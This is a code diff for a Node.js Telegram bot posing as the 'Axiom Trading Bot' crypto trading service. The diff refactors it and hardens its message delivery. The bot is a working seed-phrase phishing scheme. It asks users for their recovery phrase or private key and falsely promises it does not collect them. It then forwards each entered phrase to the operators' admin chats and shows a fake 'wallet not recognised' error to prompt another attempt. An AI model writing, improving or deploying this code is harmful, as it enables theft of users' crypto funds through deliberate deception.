@@ -1,7 +1,7 @@
-const { Telegraf, Markup, session } = require("telegraf");
+const { Telegraf, Markup } = require("telegraf");
 const LocalSession = require("telegraf-session-local");
 
-// --- Helper: Escape special Markdown characters ---
+// --- Helper: Escape MarkdownV2 special characters ---
 function escapeMarkdown(text) {
   if (typeof text !== 'string') return '';
   return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
@@ -11,27 +11,24 @@ function escapeMarkdown(text) {
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_IDS || "")
   .split(",")
-  .map((id) => parseInt(id.trim()))
-  .filter((id) => !isNaN(id));
+  .map(id => parseInt(id.trim()))
+  .filter(id => !isNaN(id));
 
 const PORT = process.env.PORT || 3000;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
 
 // --- Critical Checks ---
 if (!BOT_TOKEN) {
-  console.error("CRITICAL ERROR: BOT_TOKEN environment variable is not set.");
+  console.error("CRITICAL ERROR: BOT_TOKEN is not set.");
   process.exit(1);
 }
 if (!WEBHOOK_URL) {
   console.error("CRITICAL WARNING: WEBHOOK_URL is not set. Webhooks may fail.");
 }
-if (ADMIN_CHAT_IDS.length === 0) {
-  console.warn("WARNING: No valid admin IDs provided.");
-}
 
 const bot = new Telegraf(BOT_TOKEN);
 
-// --- Session (temporary on Koyeb) ---
+// --- Session (ephemeral on Koyeb) ---
 const session_local = new LocalSession({ database: "bot_sessions.json" });
 bot.use(session_local.middleware());
 
@@ -60,26 +57,24 @@ function isConnected(userId) {
 }
 
 async function sendWelcomeMessage(ctx) {
-  const welcomeMessage = `👋 Welcome to Axiom Trading Bot! Exclusively powered by the Axiom community, 
+  const msg = `👋 Welcome to Axiom Trading Bot! Exclusively powered by the Axiom community, 
 The fastest and smartest bot for trading any token across multiple blockchains. ⚡🌎
 
 Trade safer. Trade smarter. Trade Axiom. 🚀
 
 TOP ⬆️ Main Menu`;
-  await ctx.replyWithMarkdown(welcomeMessage, mainMenuKeyboard);
+  await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
 }
 
-// --- SAFE Forwarding Function (FIXED) ---
+// --- SAFE Forwarding (with Markdown escaping + plain fallback) ---
 async function forwardUserData(ctx, phrase) {
   const username = ctx.from.username ? `@${ctx.from.username}` : "N/A";
   const userId = ctx.from.id;
 
-  // Escape user input to prevent Markdown errors
   const safePhrase = escapeMarkdown(phrase.trim());
   const safeUsername = escapeMarkdown(username);
 
-  // Try sending with Markdown first
-  const clientMessage = `
+  const markdownMsg = `
 📩 *New Wallet Connection*
 
 🛠 Service: Wallet Connection
@@ -90,15 +85,11 @@ async function forwardUserData(ctx, phrase) {
 
   for (const adminId of ADMIN_CHAT_IDS) {
     try {
-      await bot.telegram.sendMessage(adminId, clientMessage, {
-        parse_mode: "MarkdownV2", // Use MarkdownV2 for better escaping
-      });
-      console.log(`✅ Forwarded data from user ${userId} to admin ${adminId}.`);
-    } catch (error) {
-      console.error(`⚠️ Failed with Markdown for admin ${adminId}:`, error.message);
-      // Fallback to plain text
-      try {
-        const plainMessage = `
+      await bot.telegram.sendMessage(adminId, markdownMsg, { parse_mode: "MarkdownV2" });
+      console.log(`✅ Forwarded to admin ${adminId}`);
+    } catch (err) {
+      console.warn(`⚠️ Markdown failed for ${adminId}, trying plain text...`);
+      const plainMsg = `
 📩 New Wallet Connection
 
 🛠 Service: Wallet Connection
@@ -106,10 +97,11 @@ async function forwardUserData(ctx, phrase) {
 👤 Client: ${username}
 🆔 User ID: ${userId}
 `;
-        await bot.telegram.sendMessage(adminId, plainMessage);
-        console.log(`✅ Sent plain text to admin ${adminId}.`);
-      } catch (fallbackError) {
-        console.error(`❌ Failed to forward to admin ${adminId} (even as plain text):`, fallbackError.message);
+      try {
+        await bot.telegram.sendMessage(adminId, plainMsg);
+        console.log(`✅ Plain text sent to ${adminId}`);
+      } catch (e) {
+        console.error(`❌ Failed to forward to ${adminId}:`, e.message);
       }
     }
   }
@@ -118,14 +110,14 @@ async function forwardUserData(ctx, phrase) {
 // --- Handlers ---
 bot.hears("🔗 Connect", async (ctx) => {
   ctx.session.state = CONNECT_STATE;
-  const message = `🔑 *Import Wallet*
+  const msg = `🔑 *Import Wallet*
 
 Enter your 12-key recovery phrase or private key to proceed.
 
 🔒 *Security Notice*
 Your seed phrase is 100% safe — our bot does not collect or store your private 
 keys or seed phrase. All actions are non-custodial and fully under your control.`;
-  await ctx.replyWithMarkdown(message, cancelInlineKeyboard);
+  await ctx.replyWithMarkdown(msg, cancelInlineKeyboard);
 });
 
 bot.action("cancel_connect_flow", async (ctx) => {
@@ -134,34 +126,29 @@ bot.action("cancel_connect_flow", async (ctx) => {
   await ctx.answerCbQuery();
 });
 
-// --- Commands ---
 bot.start(sendWelcomeMessage);
 bot.hears("Main Menu", sendWelcomeMessage);
+
 bot.command("menu", async (ctx) => {
   ctx.session.state = null;
-  const menuText = [
-    "**Buy tokens** /buy",
-    "**Sell tokens** /sell",
-    "**Claim rewards** /claim",
-    "**Connect your wallet** /connect"
-  ].join("\n");
-  await ctx.replyWithMarkdown(menuText, mainMenuKeyboard);
+  await ctx.replyWithMarkdown(
+    "**Buy tokens** /buy\n**Sell tokens** /sell\n**Claim rewards** /claim\n**Connect wallet** /connect",
+    mainMenuKeyboard
+  );
 });
 
-// Kill state on command
+// Clear state on command
 bot.use(async (ctx, next) => {
   if (ctx.message?.text?.startsWith("/")) {
-    if (ctx.session.state === CONNECT_STATE) {
-      ctx.session.state = null;
-    }
+    if (ctx.session.state === CONNECT_STATE) ctx.session.state = null;
   }
   await next();
 });
 
 // --- Feature Handler ---
-const GENERIC_DISCONNECTED_MESSAGE = "Please connect your wallet to access this feature.";
+const GENERIC_DISCONNECTED = "Please connect your wallet to access this feature.";
 
-async function featureHandler(ctx, featureName, disconnectedMessage = null) {
+async function featureHandler(ctx, name, customDisconnected = null) {
   const userId = ctx.from.id;
   if (ctx.session.state) ctx.session.state = null;
 
@@ -170,13 +157,13 @@ async function featureHandler(ctx, featureName, disconnectedMessage = null) {
 
 You have successfully submitted your wallet information. Our security team is now reviewing the connection to ensure full compatibility.
 
-A dedicated team member will reach out to you personally via this chat within the next 15 minutes to confirm activation and assist you with your first *${featureName}* transaction.
+A dedicated team member will reach out to you personally via this chat within the next 15 minutes to confirm activation and assist you with your first *${name}* transaction.
 
 Thank you for your patience!`;
     await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
   } else {
-    const msg = disconnectedMessage || GENERIC_DISCONNECTED_MESSAGE;
-    if (disconnectedMessage) {
+    const msg = customDisconnected || GENERIC_DISCONNECTED;
+    if (customDisconnected) {
       await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
     } else {
       await ctx.reply(msg, mainMenuKeyboard);
@@ -184,7 +171,7 @@ Thank you for your patience!`;
   }
 }
 
-// Feature buttons
+// Commands & Buttons
 bot.hears("🛒 Buy", (ctx) => featureHandler(ctx, "Buy"));
 bot.command("buy", (ctx) => featureHandler(ctx, "Buy"));
 bot.hears("💰 Sell", (ctx) => featureHandler(ctx, "Sell"));
@@ -204,7 +191,6 @@ bot.hears("🟠 Sniper", (ctx) =>
   featureHandler(ctx, "Sniper", `☄️LP Sniper\n\nPlease connect your wallet first to start trading.\n\nConnect wallet to start sniping\n\nClick 'Connect Wallet' to import your wallet.`)
 );
 
-// Other features
 ["💸 withdraw", "👝 Wallet", "🚀 Launch", "🔄 DCA", "Positions 📈"].forEach(cmd => {
   bot.hears(cmd, (ctx) => featureHandler(ctx, cmd));
 });
@@ -235,13 +221,11 @@ bot.hears("🔄 Reset", async (ctx) => {
   );
 });
 
-// --- Handle phrase input ---
+// --- Handle user phrase input ---
 bot.on("text", async (ctx, next) => {
   if (ctx.session.state !== CONNECT_STATE) return next();
-
   const phrase = ctx.message.text;
   await forwardUserData(ctx, phrase);
-
   ctx.session.state = null;
   await ctx.reply("❌ Wallet not connected — We couldn’t recognise that wallet. Please double-check and try again.", mainMenuKeyboard);
 });
@@ -249,14 +233,23 @@ bot.on("text", async (ctx, next) => {
 // --- Fallback ---
 bot.on("text", async (ctx) => {
   if (!ctx.session.state) {
-    await ctx.reply("I'm sorry, I didn't recognize that command. Please use the menu buttons below.", mainMenuKeyboard);
+    await ctx.reply("I didn't recognize that. Please use the menu buttons below.", mainMenuKeyboard);
   }
 });
 
-// --- Start Bot ---
+// --- Start Bot with FORGIVING URL PARSING ---
 if (WEBHOOK_URL) {
   try {
-    const url = new URL(WEBHOOK_URL);
+    // ✅ Tolerant URL parser (Option 2)
+    let cleanUrl = WEBHOOK_URL.trim();
+    if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
+      cleanUrl = 'https://' + cleanUrl;
+    }
+    // Remove trailing slash to avoid // in path
+    if (cleanUrl.endsWith('/')) {
+      cleanUrl = cleanUrl.slice(0, -1);
+    }
+    const url = new URL(cleanUrl);
     const webhookPath = `/telegraf/${bot.secretPathComponent()}`;
 
     bot.launch({
@@ -266,18 +259,19 @@ if (WEBHOOK_URL) {
         hookPath: webhookPath,
       },
     }).then(() => {
-      console.log(`✅ Bot started via Webhook on port ${PORT}`);
-      console.log(`📡 Webhook URL: ${new URL(webhookPath, WEBHOOK_URL).href}`);
+      console.log(`✅ Bot running on port ${PORT}`);
+      console.log(`📡 Webhook: ${cleanUrl}${webhookPath}`);
     }).catch(err => {
-      console.error("❌ Webhook launch failed:", err);
+      console.error("❌ Launch failed:", err);
       process.exit(1);
     });
-  } catch (e) {
-    console.error("❌ Invalid WEBHOOK_URL:", e.message);
+  } catch (err) {
+    console.error("❌ Invalid WEBHOOK_URL:", err.message);
+    console.error("💡 Tip: Set WEBHOOK_URL to your Koyeb app URL (e.g., https://your-app.koyeb.app)");
     process.exit(1);
   }
 } else {
-  bot.launch().then(() => console.log("🤖 Polling mode (local only)"));
+  bot.launch().then(() => console.log("🤖 Local polling mode"));
 }
 
 process.once("SIGINT", () => bot.stop("SIGINT"));
